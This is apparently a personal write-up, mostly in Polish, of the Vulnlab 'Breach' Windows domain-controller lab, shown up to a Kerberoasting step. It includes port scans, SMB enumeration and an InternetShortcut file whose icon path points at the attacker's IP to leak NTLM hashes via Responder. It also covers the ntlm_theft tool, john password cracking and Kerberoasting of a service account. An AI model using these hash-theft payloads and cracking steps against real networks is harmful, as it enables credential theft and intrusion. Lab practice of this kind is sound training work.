# Breach
Windows, Medium, created by **xct**

![breach_slide](https://github.com/user-attachments/assets/d3ba0a90-294a-4f8f-985a-fdcb98134eaf)

```
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-28 20:32:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49907/tcp open  msrpc         Microsoft Windows RPC

```
```
dig @10.10.100.171 breach.vl any
dig @10.10.100.171 breach.vl axrf 
```
- nic ciekawego

```
enum4linux -u anonymous -a 10.10.100.171
enum4linux  -a 10.10.100.171
enum4linux -u guest -a 10.10.100.171
```

![{CD6EF018-BA6E-4B86-8DB9-BC259797566A}](https://github.com/user-attachments/assets/74bf33db-8fb4-4e1b-9d7d-9fb747b978ec)

![{942E308C-25DE-45F7-9EBA-007AB1554DF5}](https://github.com/user-attachments/assets/ff6afa0c-ef49-454d-8a04-1cf88e10d8e0)

![{DB2E06CF-0CCA-48D7-8BE3-644C3052DE30}](https://github.com/user-attachments/assets/05b3371d-9728-4f2b-b240-7fcdf52fa8eb)

ale za to dostaliśmy 3 username'y :D

```
mask ""
recurse
prompt
mget *
```

z `Users` trochę więcej

![{4F23DF53-A5C3-47F6-9077-B5F747FBE363}](https://github.com/user-attachments/assets/b491cce1-e183-454f-bfa4-b96d44073c41)

This is interesting for me (yeah maybe too much ctfs)

![{F1F0A729-9805-458C-8E99-462B03BECFDC}](https://github.com/user-attachments/assets/e26ead42-7abe-44c4-9c9c-a764b0f9179f)

![{2E617D97-9E8E-4BD4-B0EA-61829A6263BC}](https://github.com/user-attachments/assets/62978a73-097d-4335-8796-3b0e200df6e5)

W sumie kilka minut posiedziałem i nic nie znalazłem

Ale dobra, bo ja płynę, a tutaj wszystko pewnie jest logiczne. Jak mamy WRITE na share to znaczy, że tam pewnie ktoś wchodzi.

włączamy `sudo responder -i tun0` i szukamy payloadu

nr 1
```
[InternetShortcut]
URL=http://10.8.4.124
IconIndex=0
IconFile=\\10.8.4.124\leak\leak.ico
```

dobra podwóch mi się odechciało. użyję `https://github.com/Greenwolf/ntlm_theft.git`

![{DF49B923-FB14-44D3-AA85-0E5D5A91DE04}](https://github.com/user-attachments/assets/099d8350-2a3f-4892-bbf2-916d1e9cee09)

i znowu sztuczka z masyowym przesyłaniem

![{53EEC5AC-E898-4C3E-B5C7-DF659BD67ADF}](https://github.com/user-attachments/assets/29523174-45e9-446f-967f-135f06aa4133)

- nic po 2 minutach. Odnoszę wrażenie, że folder o nazwie `transfer` może mieć tą nazwę nie bez powodu xd

![{6DB7DC6E-8AF9-4C8C-AE8A-C945EE9F26CF}](https://github.com/user-attachments/assets/76b53357-0650-47c9-89f8-47ea85b39578)

yes..

![{DBF9EDD0-BF6D-46C2-BA1A-7A13FE512CF8}](https://github.com/user-attachments/assets/638cd22b-2004-4de3-9ab6-f818845302c6)

a to mnie zaskoczyli

okey my bad...

![{48299F14-D958-4CE6-B1DD-7780683C6E7C}](https://github.com/user-attachments/assets/e1843f12-aad9-4e11-a82d-6f46091e2733)

after correction john cracked it in 00sek

![{C938CBDA-424C-4E0C-82F4-A37FAA14667C}](https://github.com/user-attachments/assets/4547518c-a868-4c3a-8ff1-726a32f6f65d)

![{09740161-3FE9-4F20-BE79-C0E71EA2CA7C}](https://github.com/user-attachments/assets/b0864eac-3608-4452-add7-1ad5c0fb69a0)

mamy jakiś pliczek
- local.txt to flaga

- 
![{21D09F77-729F-469C-9654-4DE622DCA38C}](https://github.com/user-attachments/assets/2e1558fa-8c14-435d-8fc8-9b87a36f0c71)

we also have access to anoter users but their directories are empty.

![{E562EC31-A68C-4CC5-95B8-384A53BB8015}](https://github.com/user-attachments/assets/1948165f-d412-4f57-9807-f84b9029fa4e)

o kerberoassting

John znowu złamał w 00sek

```
john hash2 -w=~/SHARED/lists/rockyou.txt
```

user nazywa się `svc_mssql`, ale nie pamiętam, żeby port 1433 był otwarty.

